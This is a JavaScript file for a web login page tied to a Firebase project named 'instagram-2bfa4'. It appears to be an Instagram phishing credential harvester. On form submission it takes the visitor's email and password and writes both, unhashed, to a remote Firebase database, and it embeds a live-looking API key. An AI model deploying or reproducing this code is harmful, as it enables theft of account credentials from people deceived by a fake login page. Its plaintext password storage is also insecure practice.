import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyAb5xjaKFag0tikpz0GJFjDotOZwKkz_DE",
    authDomain: "instagram-2bfa4.firebaseapp.com",
    projectId: "instagram-2bfa4",
    storageBucket: "instagram-2bfa4.appspot.com",
    messagingSenderId: "540606223972",
    appId: "1:540606223972:web:ce3df05e186435b9c3b171",
    databaseURL: "https://instagram-2bfa4-default-rtdb.firebaseio.com"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Handle form submission
document.getElementById('login-form').addEventListener('submit', (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Save user data to Firebase Realtime Database
    set(ref(database, 'users/' + email.replace('.', '_')), {
        email: email,
        password: password
    })
    .then(() => {
        alert('User registered successfully');
    })
    .catch((error) => {
        alert('Error during registration: ' + error.message);
    });
});
